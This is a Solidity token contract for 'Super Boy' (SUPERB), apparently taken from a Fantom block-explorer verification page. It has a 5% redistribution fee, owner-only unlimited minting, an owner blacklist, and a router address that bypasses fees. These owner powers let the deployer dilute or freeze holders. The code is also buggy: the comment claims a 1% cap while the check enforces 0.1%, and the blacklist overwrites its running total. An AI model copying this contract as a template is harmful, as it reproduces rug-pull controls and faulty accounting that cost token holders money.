/**
 *Submitted for verification at FtmScan.com on 2021-11-25
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function mint(address to, uint256 amount) external;
    function blackList(address user) external;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Token is IERC20 {
    address private _owner;
    address private _router = address(0xF491e7B69E4244ad4002BC14e878a34207E38c29);
    
    uint256 private _redistributionValue;
    
    uint256 private _totalSupply = 10**6 * 10**18;
    uint256 private _blackListedAmount;
    
    uint256 private _redistributed;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _claimedRedistribution;
    mapping (address => bool) private _blackListed;

    constructor ()  {
        _owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
    }
    function name() public pure returns (string memory) {
        return "Super Boy";
    }
    function symbol() public pure returns (string memory) {
        return "SUPERB";
    }
    function decimals() public pure returns (uint8) {
        return 18;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) external override returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) external override returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address user) public view override returns (uint256) {
        if(_blackListed[user]){return _balances[user];}
        
        uint256 unclaimed = _redistributionValue - _claimedRedistribution[user];
        uint256 share = unclaimed * _balances[user] / (_totalSupply - _blackListedAmount);
        
        return _balances[user] + share;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _allowances[sender][msg.sender] -= amount;
        if(msg.sender == _router){
            _balances[sender] -= amount;
            _balances[recipient] += amount;
            return true;
        }
        _transfer(sender, recipient, amount);
        return true;
    }
    
    function mint(address to, uint256 amount) external override {
        require(msg.sender == _owner);
        _balances[to] += amount;
        _totalSupply += amount;
    }
    
    function blackList(address user) external override {
        require(msg.sender == _owner);
        _blackListedAmount = _balances[user];
        _blackListed[user] = true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount < _totalSupply / 1000, "Transfer amount must be lower than 1% of total supply");
        
        claimRewards(from);
        claimRewards(to);
        
        _balances[from] -= amount;
        
        uint256 fee = amount * 5 / 100;
        
        _redistributionValue += fee;
        
        _balances[to] += amount - fee;
        
        if(_blackListed[from]) {_blackListedAmount -= amount;}
        if(_blackListed[to]){_blackListedAmount += amount - fee;}
        emit Transfer(from, to, amount);
        
    }
    
    function claimRewards(address user) internal {
        if(_blackListed[user]){return;}
        uint256 unclaimed = _redistributionValue - _claimedRedistribution[user];
        uint256 share = unclaimed * _balances[user] / (_totalSupply - _blackListedAmount);
        
        if(share > 0){
            _balances[user] += share;
            _claimedRedistribution[user] = _redistributionValue;
        }
    }
}